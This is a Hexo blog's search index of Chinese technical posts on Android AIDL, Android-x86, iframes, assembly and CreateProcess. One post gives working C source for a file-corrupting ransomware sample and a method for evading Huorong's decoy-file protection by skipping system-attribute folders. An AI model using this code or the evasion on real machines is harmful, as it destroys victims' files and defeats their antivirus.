{"pages":[],"posts":[{"title":"在Android中使用AIDL实现进程间通信","text":"在Android中，可以使用AIDL（The Android Interface Definition Language，安卓接口定义语言）实现进程间通信。本文记录了使用AIDL实现进程间通信的方法。 Android官方给的AIDL文档地址： https://developer.android.com/guide/components/aidl 开发工具Android Studio Giraffe | 2022.3.1 Patch 1 创建项目使用Android Studio创建两个APP项目，分别命名为AIDLServer和AIDLClient，模板均选择Empty Views Activity： 编程目标通过AIDL实现进程间通信，让AIDLClient获取到AIDLServer的进程ID。 首先编写AIDLServer的代码，在AIDLServer界面上打印AIDLServer的进程ID。 在activity_main.xml中为中间的Hello World!字符串添加ID，然后在MainActivity.java的onCreate中让其打印AIDLServer的进程ID： 编译运行APP，AIDLServer在本次运行的进程ID为2820： 编写AIDL接口由官方文档可知，使用AIDL创建服务包含以下几个步骤： 创建aidl文件 实现接口 将接口暴露给client 创建aidl文件文档中说，需要将aidl文件保存在src/文件夹下，build项目时，SDK工具会在gen/路径下自动生成一个java文件，文件名与aidl文件相同。 在Android Studio左侧Project栏中，右键src/路径，选择新建aidl文件，命名为IRemoteService.aidl。如果提示Requires setting the buildFeatures.aidl to true in the build file，可以编辑app/路径下的build.gradle.kts文件，在android{...}中添加buildFeatures.aidl = true，并Sync Project with Gradle Files： 会发现IRemoteService.aidl的路径为src/main/aidl/包名/： AIDL文件的内容基本可以照抄文档： 12345678910111213141516// IRemoteService.aidlpackage com.example.aidlserver;// Declare any non-default types here with import statements/** Example service interface */interface IRemoteService { /** Request the process ID of this service. */ int getPid(); /** Demonstrates some basic types that you can use as parameters * and return values in AIDL. */ void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString);} build项目后，可在build/generated/aidl_source_output_dir/debug/out/包名/路径下找到IRemoteService.java文件，文件内容非常复杂。 实现接口并将接口暴露给client文档中给出的示例，使用匿名类扩展IRemoteService.java中的IRemoteService.Stub类，并实现了getPid方法： 123456789private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid(){ return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Does nothing. }}; 关于Java匿名类可参考：https://www.runoob.com/java/java-anonymous-class.html 暴露接口的方法是：扩展Service类，并实现其中的onBind方法，让onBind返回IRemoteService.Stub类的实例binder。 在APP的项目中，src/main/java/包名/下，新建一个RemoteService类RemoteService.java，其内容可直接照抄文档： 1234567891011121314151617181920212223242526272829package com.example.aidlserver;import android.app.Service;import android.content.Intent;import android.os.IBinder;import android.os.Process;public class RemoteService extends Service { @Override public void onCreate() { super.onCreate(); } @Override public IBinder onBind(Intent intent) { // Return the interface. return binder; } private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid(){ return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Does nothing. } };} 在manifest中声明service代码编写完成后，还需要编辑AndroidManifest.xml，在&lt;application&gt;的tag中添加&lt;service&gt;，声明RemoteService这个服务。 12345678910&lt;application ...&gt; &lt;activity android:name=&quot;.MainActivity&quot; android:exported=&quot;true&quot;&gt; ... &lt;/activity&gt; &lt;service android:name=&quot;.RemoteService&quot; android:exported=&quot;true&quot;/&gt;&lt;/application&gt; 注意service的tag里面需要添加android:exported=&quot;true&quot;属性。 之后即可编译并运行APP。 客户端调用IPC方法官方文档中说，如果client和service运行在不同的APP中，那么client的src/文件夹中需要有AIDL文件的拷贝。可以直接将AIDLService的src/main/aidl文件夹复制到AIDLClient项目的src/main路径下。复制完成后，AIDLClient的文件结构如下图所示： 另外，如果使用的是版本较新的Android Studio，则和前面的AIDLServer相同，也要编辑app/路径下的build.gradle.kts文件，在android{...}中添加buildFeatures.aidl = true。 此时build AIDLClient项目，即可在build/generated/aidl_source_output_dir/debug/out/com.example.aidlserver/下看到IRemoteService.java。 在AIDLClient的src/main/java/MainActivity.java中，实现ServiceConnection类，这里可以仿照文档中的示例，在MainActivity中用匿名类的方法实现，并在ServiceConnection的onServiceConnected方法中，调用IRemoteService.Stub.asInterface(service)，将service转换成IRemoteService类型。 12345678910111213141516171819202122232425import com.example.aidlserver.IRemoteService;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { ... } /** The primary interface we are calling on the service. */ IRemoteService mService = null; /** * Class for interacting with the main interface of the service. */ private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { mService = IRemoteService.Stub.asInterface(service); } public void onServiceDisconnected(ComponentName className) { mService = null; } };} 接下来，在onCreate中调用bindService，传入实现的ServiceConnection，文档中给的示例是： 123Intent intent = new Intent(Binding.this, RemoteService.class);intent.setAction(IRemoteService.class.getName());bindService(intent, mConnection, Context.BIND_AUTO_CREATE); 但是在实际编写AIDLClient的代码时，遇到一个问题：RemoteService这个类是在AIDLServer中编写的，AIDLClient里面没有这个类，所以没法使用RemoteService.class这个参数。 在网上找到了这个问题的解决方法：https://stackoverflow.com/a/55697742 在onCreate中编写这些代码： 12345678910@Overrideprotected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(); intent.setAction(IRemoteService.class.getName()); intent.setClassName(&quot;com.example.aidlserver&quot;, &quot;com.example.aidlserver.RemoteService&quot;); bindService(intent, mConnection, Context.BIND_AUTO_CREATE);} 最后在onServiceConnected中，即可调用mService.getPid获取AIDLServer的进程ID。MainActivity.java的完整代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.example.aidlclient;import androidx.appcompat.app.AppCompatActivity;import android.content.ComponentName;import android.content.Context;import android.content.Intent;import android.content.ServiceConnection;import android.os.Bundle;import android.os.IBinder;import android.os.Process;import android.os.RemoteException;import android.widget.TextView;import com.example.aidlserver.IRemoteService;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(); intent.setAction(IRemoteService.class.getName()); intent.setClassName(&quot;com.example.aidlserver&quot;, &quot;com.example.aidlserver.RemoteService&quot;); bindService(intent, mConnection, Context.BIND_AUTO_CREATE); } /** The primary interface we are calling on the service. */ IRemoteService mService = null; /** * Class for interacting with the main interface of the service. */ private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { // This is called when the connection with the service is // established, giving us the service object we can use to // interact with the service. We are communicating with our // service through an IDL interface, so get a client-side // representation of that from the raw service object. mService = IRemoteService.Stub.asInterface(service); if (mService != null) { try { String text = &quot;Service PID: &quot; + String.valueOf(mService.getPid()) + &quot;\\nClient PID: &quot; + Process.myPid(); TextView hello_world = (TextView) findViewById(R.id.hello_world); hello_world.setText(text); } catch (RemoteException e) { throw new RuntimeException(e); } } } public void onServiceDisconnected(ComponentName className) { // This is called when the connection with the service is // unexpectedly disconnected&amp;mdash;that is, its process crashed. mService = null; } };} 运行结果在Android设备上安装AIDLServer和AIDLClient，先后运行AIDLServer和AIDLClient，可以发现AIDLClient成功获取到AIDLServer的进程ID：","link":"/2023/09/08/android-aidl-ipc/"},{"title":"在VMware Workstation中安装X86版Android 2.2，并运行2010年的安卓游戏","text":"在Reddit上看到一篇帖子，希望能找到一个老版本的安卓模拟器，在上面运行一款2010年左右，由广州奥兹软件公司制作的手机游戏Battleground，中文名称为《战争之王》，该游戏无法在Android 4.0+的系统上运行。 https://www.reddit.com/r/BlueStacks/comments/rgfl7z/question_old_version_of_android/ 搜索后找到这款游戏的APK文件：https://www.androidout.com/item/android-apps/27008/battleground/ 我在VMware® Workstation 15 Pro上安装Android 2.2虚拟机，在里面成功安装并运行了这款游戏，不过没法播放游戏声音，但是不影响正常游玩。 安装Android 2.2虚拟机下载Android-x86 2.2的ISO文件Android-x86 2.2的ISO文件由Android-x86项目提供：https://www.android-x86.org/ 下载地址： https://sourceforge.net/projects/android-x86/files/Release%202.2/ 下载文件：android-x86-2.2-generic.iso 在VMware中创建虚拟机新建虚拟机，选择典型，安装程序光盘映像文件选择android-x86-2.2-generic.iso 取消勾选“创建后开启此虚拟机” 编辑.vmx文件的ethernet选项打开虚拟机文件夹下的.vmx文件，将这里的ethernet0.virtualDev的e1000修改为vlance。如果文件中包含中文，这一步需要注意编码问题，通常该文件的编码是GB 2312。 启动虚拟机，安装Android系统启动虚拟机后进入这个页面，可以不安装系统直接Live CD进入系统，也可以将Android-x86至硬盘。 选择Installation安装，再按一次回车，进到这里： 方向键左右可以选择，回车可以确认。依次选择：New 👉 Primary 👉 Size (in MB): 10733.99（直接回车） 👉 Bootable 👉 Write 👉 输入yes然后回车 👉 Quit 进到这个页面，选中sda1后直接回车： 方向键下，选中ext3，然后回车： 后面直接全部回车即可。另外：在这里有一个Create a fake SD card功能，我试过发现，Android 2.2的镜像用了这个功能后，会导致无法开机，不过在Android 2.3镜像里这个功能似乎是正常的。因为目前是用的Android 2.2，所以直接Run Android-x86： Android 2.3的镜像可在这里下载：https://code.google.com/archive/p/android-x86/downloads 检查网络连接是否正常在虚拟机中，Alt+F1可进入命令行界面，Alt+F7可返回图形界面。 Alt+F1之后，输入ip a命令，如果网络正常，可以看到eth0，以及下面的IP地址，我这里的IP地址是192.168.163.154。 网络正常时可以ping通baidu.com： 如果网络有问题，并且只能看到lo，看不到eth0，则需要检查之前的.vmx文件中ethernet0.virtualDev是否已经修改为了vlance。如果看到了eth0，但是没有IP地址，网络也连不上，则可以参考这里的解决方法： Solve Android x86 No Network Problems in VMware Workstation | virten.net 也就是运行下面两条命令： 12setprop net.dns1 8.8.8.8dhcpcd eth0 如果网络正常，那么记住eth0的这个IP地址。然后，Alt+F7返回图形界面。 adb连接Android虚拟机并安装apk文件在Windows宿主机中，使用adb通过IP地址连接到Android虚拟机，命令为adb connect [IP地址]，例如我这里的IP地址是192.168.163.154，那么连接命令为adb connect 192.168.163.154： 123456&gt; adb connect 192.168.163.154connected to 192.168.163.154:5555&gt; adb devicesList of devices attached192.168.163.154:5555 device 之后，再cd到apk所在路径，用adb install安装APP： 12345&gt; adb install battleground.apkPerforming Push Installbattleground.apk: 1 file pushed, 0 skipped. 10.7 MB/s (11615871 bytes in 1.031s) pkg: /data/local/tmp/battleground.apkSuccess 现在就能在虚拟机中运行该游戏了：","link":"/2024/02/16/android-x86-2-2-battleground/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2021/01/12/hello-world/"},{"title":"设置iframe中body的contentEditable属性","text":"在HTML中，实现富文本/所见即所得编辑器的一种方法是将iframe中body的contentEditable属性设置为true。QQ邮箱的写信功能就使用了这一原理： 获取iframe中body的方法可以在这里找到： html - How to get the body's content of an iframe in Javascript? - Stack Overflow 编写JS代码，将contentEditable设置为true： 123var iframe = document.getElementById(&quot;ifrm&quot;);var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;iframeDocument.body.contentEditable = &quot;true&quot;; 这段JS代码需要在iframe加载之后执行，可以将其放在window.onload当中: 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script&gt; window.onload = function() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; iframeDocument.body.contentEditable = &quot;true&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; document.onload和window.onload的区别是：document.onload会在DOM加载后、图片等外部资源加载前触发，window.onload在整个页面（包括CSS文件、脚本文件、图片等）加载后才会触发。 现在打开页面，就会出现一个框，可以向框中粘贴一些有样式的文本。 接下来，再给页面添加一个按钮，用户点击按钮向网页提交输入的文本。可以构造一个表单： 12345&lt;form action=https://httpbin.org/post method=post&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt;&lt;/form&gt; 用户提交表单时，执行一段JS代码，将iframe的内容复制给下面的input hidden。实现这一功能的JS代码为： 12345function copyIfrm2Hidden() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; document.getElementById(&quot;ifrmcontent&quot;).value = iframeDocument.body.innerHTML;} 设置form的onsubmit属性，在提交表单时执行copyIfrm2Hidden函数： 12345&lt;form action=https://httpbin.org/post method=post onsubmit=&quot;copyIfrm2Hidden()&quot;&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt;&lt;/form&gt; 完整代码为： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script&gt; function copyIfrm2Hidden() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; document.getElementById(&quot;ifrmcontent&quot;).value = iframeDocument.body.innerHTML; } window.onload = function() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; iframeDocument.body.contentEditable = &quot;true&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=https://httpbin.org/post method=post onsubmit=&quot;copyIfrm2Hidden()&quot;&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 也可以使用其他方式提交请求，比如很多邮箱都使用XMLHttpRequest的方式发送邮件。","link":"/2022/01/23/html-iframe-body-contenteditable/"},{"title":"绕过火绒勒索病毒诱捕功能的一种方法","text":"火绒的设置中可以勾选开启勒索病毒诱捕功能，开启后，火绒会在C盘创建两个文件夹，里面包含一些诱饵文件。当勒索软件对这些诱饵文件加密时，就会被火绒拦截。 https://bbs.huorong.cn/thread-22817-1-1.html 这两个文件夹的属性与普通的用户文件夹不同。勒索软件如果只需要加密普通的用户文件夹，则只用进行一些简单的判断就能识别并避开这些诱饵文件了。 火绒创建的两个文件夹在C盘中执行dir /A可以查看所有被隐藏的文件夹： 1234567891011121314151617181920212223242526C:\\&gt;dir /A 驱动器 C 中的卷没有标签。 卷的序列号是 D227-C50D C:\\ 的目录2021/09/08 20:52 &lt;DIR&gt; program6942021/09/08 20:37 &lt;DIR&gt; $Recycle.Bin2021/09/09 10:43 &lt;DIR&gt; $WinREAgent2019/12/07 17:08 413,738 bootmgr2019/12/07 17:08 1 BOOTNXT2021/07/29 19:06 &lt;JUNCTION&gt; Documents and Settings [C:\\Users]2021/07/29 19:14 8,192 DumpStack.log.tmp2021/07/29 19:14 2,013,265,920 pagefile.sys2019/12/07 17:14 &lt;DIR&gt; PerfLogs2021/09/09 10:56 &lt;DIR&gt; Program Files2021/09/08 20:52 &lt;DIR&gt; Program Files (x86)2021/09/08 20:52 &lt;DIR&gt; ProgramData2021/07/29 19:06 &lt;DIR&gt; Recovery2021/07/29 19:14 16,777,216 swapfile.sys2021/09/08 20:52 &lt;DIR&gt; System Volume Information2021/07/29 19:14 &lt;DIR&gt; Users2021/09/08 20:45 &lt;DIR&gt; Windows2021/09/08 20:52 &lt;DIR&gt; Zsetup287 5 个文件 2,030,465,067 字节 13 个目录 3,322,830,848 可用字节 火绒创建的两个文件夹名称分别为&quot; program694&quot;和&quot;Zsetup287&quot;，它们在文件资源管理器中是看不到的，这一特性可以避免用户误访问诱饵文件造成误报。 借助FindFirstFile和FindNextFile可以获取一个路径下的所有文件和文件夹，这些文件的信息都返回到一个WIN32_FIND_DATA类型的结构体中，这个结构体里有个元素dwFileAttributes，表示了该文件的信息，如是否为文件夹、是否为隐藏文件、是否为系统文件等。 WIN32_FIND_DATAA 编写程序，查看C盘中文件的文件名和部分文件属性： 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void ParseFileSystem(char *path) { WIN32_FIND_DATAA FileData; HANDLE hFindFile = FindFirstFileA(path, &amp;FileData); do { printf(FileData.cFileName); for (int i = 0; i &lt; 25 - (int)strlen(FileData.cFileName); i++) { printf(&quot; &quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) { printf(&quot;\\t&lt;DIR&gt; &quot;); } else { printf(&quot;\\t&lt;FILE&gt;&quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_HIDDEN) { printf(&quot;\\tHidden&quot;); } else { printf(&quot;\\tShow &quot;); } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_SYSTEM) { printf(&quot;\\tSystem&quot;); } else { printf(&quot;\\tNormal&quot;); } printf(&quot;\\n&quot;); } while (FindNextFileA(hFindFile, &amp;FileData));}int main(int argc, char **argv) { char path[100] = &quot;C:\\\\*&quot;; ParseFileSystem(path); return 0;} 运行结果： 12345678910111213141516171819C:\\&gt;d:\\mydir.exe program694 &lt;DIR&gt; Hidden System$Recycle.Bin &lt;DIR&gt; Hidden System$WinREAgent &lt;DIR&gt; Hidden Normalbootmgr &lt;FILE&gt; Hidden SystemBOOTNXT &lt;FILE&gt; Hidden SystemDocuments and Settings &lt;DIR&gt; Hidden SystemDumpStack.log.tmp &lt;FILE&gt; Hidden Systempagefile.sys &lt;FILE&gt; Hidden SystemPerfLogs &lt;DIR&gt; Show NormalProgram Files &lt;DIR&gt; Show NormalProgram Files (x86) &lt;DIR&gt; Show NormalProgramData &lt;DIR&gt; Hidden NormalRecovery &lt;DIR&gt; Hidden Systemswapfile.sys &lt;FILE&gt; Hidden SystemSystem Volume Information &lt;DIR&gt; Hidden SystemUsers &lt;DIR&gt; Show NormalWindows &lt;DIR&gt; Show NormalZsetup287 &lt;DIR&gt; Hidden System 发现火绒创建的两个诱饵文件夹都具有FILE_ATTRIBUTE_HIDDEN和FILE_ATTRIBUTE_SYSTEM属性。勒索软件只需要避开具有FILE_ATTRIBUTE_SYSTEM属性的文件夹就可以避开火绒的诱饵文件了。 编写简单的勒索软件样本首先写一个可以被火绒拦截的简单勒索软件。只需要借助FindFirstFile和FindNextFile遍历文件，判断一下文件后缀名，然后再读写文件就行了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// 将目录名dir和文件名filename拼接void concat_path(char *dir, char *filename) { int i = 0; while (dir[i] != '\\0') { i++; } if (dir[i-1] != '\\\\') { dir[i] = '\\\\'; i++; } int j = 0; while (filename[j] != '\\0') { dir[i] = filename[j]; i++; j++; } dir[i] = '\\0';}// 从路径中删去最后一项目录名/文件名void remove_file_path(char *dir) { int i = 0; while (dir[i] != '\\0') { i++; } if (dir[i-1] == '\\\\') { i -= 2; } while (dir[i] != '\\\\') { i--; } dir[i+1] = '\\0';}BOOL is_target_filetype(char *filepath) { int length = strlen(filepath); BOOL result = FALSE; if (length &gt;= 4) { result = result || !strcmp(&amp;filepath[length-4], &quot;.doc&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.xls&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.sql&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.pem&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.jpg&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.rtf&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.txt&quot;); result = result || !strcmp(&amp;filepath[length-4], &quot;.mdb&quot;); } if (length &gt;= 5) { result = result || !strcmp(&amp;filepath[length-5], &quot;.xlsx&quot;); result = result || !strcmp(&amp;filepath[length-5], &quot;.docx&quot;); } return result;}void ParseFileSystem(char *path) { WIN32_FIND_DATAA FileData; concat_path(path, &quot;*&quot;); HANDLE hFindFile = FindFirstFileA(path, &amp;FileData); remove_file_path(path); do { if (FileData.cFileName[0] == '.') { continue; } if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) { concat_path(path, FileData.cFileName); ParseFileSystem(path); remove_file_path(path); } else if (is_target_filetype(FileData.cFileName)) { concat_path(path, FileData.cFileName); printf(path); HANDLE hFile = CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFile) { goto nextfile; } char Buffer[100]; int num; if (!ReadFile(hFile, Buffer, 100, &amp;num, NULL)) { goto nextfile; } for (int i = 0; i &lt; num; i++) { Buffer[i] = ~Buffer[i]; } SetFilePointer(hFile, 0, NULL, FILE_BEGIN); if(WriteFile(hFile, Buffer, num, NULL, NULL)) { printf(&quot;\\tsuccess&quot;); } nextfile: printf(&quot;\\n&quot;); remove_file_path(path); } } while (FindNextFileA(hFindFile, &amp;FileData));}int main() { char path[100] = &quot;D:\\\\aaa&quot;; ParseFileSystem(path); return 0;} 编译完成后，在虚拟机中使用十六进制编辑器（如010 Editor）把&quot;D:\\aaa&quot;字符串替换成&quot;C:\\&quot;，然后在虚拟机中运行。勒索软件首先就遍历到了火绒设计的诱饵文件夹&quot; program694&quot;中的诱饵文件并尝试对其进行加密，于是就被火绒拦截了： 判断文件属性并避开诱饵文件在遍历文件的代码中添加这一段代码： 123if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_SYSTEM) { continue;} 如果文件具有FILE_ATTRIBUTE_SYSTEM属性就跳过这一文件，这样就避开了火绒的诱饵文件。用同样的方式在虚拟机中运行程序： 程序可以正常运行并且没有被火绒的勒索病毒诱捕功能拦截。","link":"/2021/09/09/ransomware-bypass-huorong-decoy-file/"},{"title":"函数参数及返回值为结构体时的汇编代码","text":"本文记录了函数参数以及返回值是结构体时，汇编代码是什么样的。本文使用的编译器为Visual Studio中的cl.exe，版本为用于 x86 的 Microsoft (R) C/C++ 优化编译器 19.28.29910 版。 定义结构体定义这样一个结构体： 12345struct tagTest { int a; long long b; char c[4];}; 编译后，各成员的偏移为： 1234567tagTest struc ; (sizeof=0x18, mappedto_56) a dd ? field_4 dd ? b dq ? c db 4 dup(?) ; string(C) field_14 dd ?tagTest ends 其中field_4和field_14是填充，结构体大小为24字节。 函数参数为结构体编写函数并调用： 12345678910long long paramTest(int p1, struct tagTest p2, int p3) { return p1 + p2.a + p2.b + p3;}int main() { struct tagTest param = {0xAAAAAAAA, 0xBBBBBBBBCCCCCCCC, &quot;aaaa&quot;}; paramTest(1, param, 3); return 0;} 调用paramTest前将参数压入堆栈的汇编代码为： 1234567891011121314151617push 3sub esp, 24mov edx, espmov eax, [ebp+param.a]mov [edx], eaxmov ecx, [ebp+param.field_4]mov [edx+4], ecxmov eax, dword ptr [ebp+param.b]mov [edx+8], eaxmov ecx, dword ptr [ebp+param.b+4]mov [edx+12], ecxmov eax, dword ptr [ebp+param.c]mov [edx+16], eaxmov ecx, [ebp+param.field_14]mov [edx+20], ecxpush 1call paramTest 首先压入第三个参数3，然后将24字节的结构体全部复制到栈中，最后压入第一个参数1，所以在调用paramTest前栈的结构为： 总结：当函数参数为结构体时，在将参数压栈的过程中，结构体中的所有内容都会复制到栈中。 函数返回值为结构体编写函数并调用： 12345678910struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}int main() { struct tagTest result = retTest(0x11111111, 0x2222222233333333); return 0;} 调用retTest函数前将参数压栈的代码： 123456push 22222222hpush 33333333h ; bpush 11111111h ; alea edx, [ebp+retVal]push edx ; retstrcall retTest 除了函数原有的两个参数外，还压了位于栈中的结构体变量retVal的地址，命名为pRetVal。 进入retTest函数，这个函数有一个struct tagTest类型的局部变量，命名为tmp。函数开头的这段汇编代码将tmp赋值为{a, b, &quot;cccc&quot;}： 12345678mov eax, [ebp+a]mov [ebp+tmp.a], eaxmov ecx, [ebp+b_low]mov edx, [ebp+b_high]mov dword ptr [ebp+tmp.b], ecxmov dword ptr [ebp+tmp.b+4], edxmov eax, dword_419000 ; &quot;cccc&quot;mov dword ptr [ebp+tmp.c], eax 接下来这段汇编代码则将tmp的内容复制到pRetVal指向的结构体retVal： 12345678910111213mov ecx, [ebp+pRetVal]mov edx, [ebp+tmp.a]mov [ecx], edxmov eax, [ebp+tmp.field_4]mov [ecx+4], eaxmov edx, dword ptr [ebp+tmp.b]mov [ecx+8], edxmov eax, dword ptr [ebp+tmp.b+4]mov [ecx+0Ch], eaxmov edx, dword ptr [ebp+tmp.c]mov [ecx+10h], edxmov eax, [ebp+tmp.field_14]mov [ecx+14h], eax 函数的返回值为pRetVal： 1mov eax, [ebp+pRetVal] 总结：当函数返回值为结构体，函数的调用方main函数会在栈中预留一段空间retVal用于存放返回值。当main函数调用retTest函数时，除了本身的两个参数外，还会压入retVal的地址&amp;retVal。retTest函数会根据传入的retVal的地址，将返回值复制到retVal当中，并返回&amp;retVal。 使用IDA的Set type...功能也能看出这一点，如果在Set type...窗口输入： 1tagTest retTest(int a, long long b) IDA会将其自动转换为： 1tagTest *retTest(tagTest *__return_ptr __struct_ptr retstr, int a, __int64 b); 其中retstr就是指向retVal的指针。 下面这两个C语言函数编译后的汇编代码应该是一样的： 12345678910111213141516171819struct tagTest retTest(int a, long long b) { struct tagTest retVal = {a, b, &quot;cccc&quot;}; return retVal;}struct tagTest *retTest2(struct tagTest *pRetVal, int a, long long b) { struct tagTest tmp = {a, b, &quot;cccc&quot;}; *pRetVal = tmp; return pRetVal;}int main() { struct tagTest result1 = retTest(0x11111111, 0x2222222233333333); struct tagTest retVal; struct tagTest *pRetVal = retTest2(&amp;retVal, 0x11111111, 0x2222222233333333); struct tagTest result2 = *pRetVal; return 0;}","link":"/2021/08/13/structure-function-parameter-return-value/"},{"title":"在Windows中使用CreateProcess创建子进程","text":"本文记录了在Windows中使用CreateProcessA创建子进程的方法。 CreateProcessA函数原型123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, //应用程序名 LPSTR lpCommandLine, //命令行 LPSECURITY_ATTRIBUTES lpProcessAttributes, //如果为NULL，则子进程不会继承新进程的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, //如果为NULL，则子进程不会继承新线程的句柄 BOOL bInheritHandles, //父进程的可继承句柄是否继承给新的进程 DWORD dwCreationFlags, //控制子进程的创建过程和优先级的标志 LPVOID lpEnvironment, //如果为NULL，则新的进程会使用父进程的环境 LPCSTR lpCurrentDirectory, //如果为NULL，则新的进程与父进程会有相同目录 LPSTARTUPINFOA lpStartupInfo, //用于设置新进程的主窗口特性 LPPROCESS_INFORMATION lpProcessInformation //PROCESS_INFORMATION指针，用于获取新进程的信息); 本文只关心lpApplicationName, lpCommandLine, lpStartupInfo, lpProcessInformation 这四个参数。 简单示例接下来，写一个简单的示例来说明这个函数的基本用法。 编写程序作为子进程编写child.c，代码为： 12345678#include &lt;stdio.h&gt;int main(int argc, char **argv) { for(int i = 0; i &lt; argc; i++) { printf(&quot;argv[%d]: %s\\n&quot;, i, argv[i]); } return 0;} 功能很简单，就是打印argv字符串数组的内容。编译后在命令行中运行child 123456789 abcdefg !@#$%： 12345&gt; child 123456789 abcdefg !@#$%argv[0]: childargv[1]: 123456789argv[2]: abcdefgargv[3]: !@#$% 编写程序调用CreateProcessA创建子进程编写程序parent，代码如下： 12345678910111213141516171819#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation return 0;} parent会调用CreateProcessA，创建子进程child，而child则会打印argv数组： 123&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp; child中argv的内容和lpCommandLine字符串的内容是一致的。 lpApplicationName可以为NULL，此时应用程序的名字为lpCommandLine中第一个被空格隔开的字符串： CreateProcessA function (processthreadsapi.h) 对简单示例的进一步完善对创建进程操作是否成功的判断CreateProcessA会返回BOOL类型的变量，表示本次创建进程的操作是否成功。因此，可以加上对函数返回值的判断： 1234567891011121314BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;Create Process Failed!\\n&quot;); return -1;} 创建进程失败时获取错误码如果CreateProcessA返回FALSE，则可以通过GetLastError获取错误码，GetLastError定义在头文件errhandlingapi.h中。 1234if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1;} 在调用CreateProcessA之前，会通过STARTUPINFO si = {0};将STARTUPINFO结构体si的内容清零。现在将清零操作去掉，重新编译运行parent，看是否还能成功创建子进程： 12&gt; parentCreate Process Failed! Error Code:998 创建子进程失败了，错误码为998，查阅System Error Codes (500-999)： ERROR_NOACCESS 998 (0x3E6) Invalid access to memory location. 发生了对内存地址的无效访问。这说明STARTUPINFO结构体使用之前清零是有必要的。 通过PROCESS_INFORMATION结构体获取子进程信息CreateProcessA的最后一个参数为LPPROCESS_INFORMATION 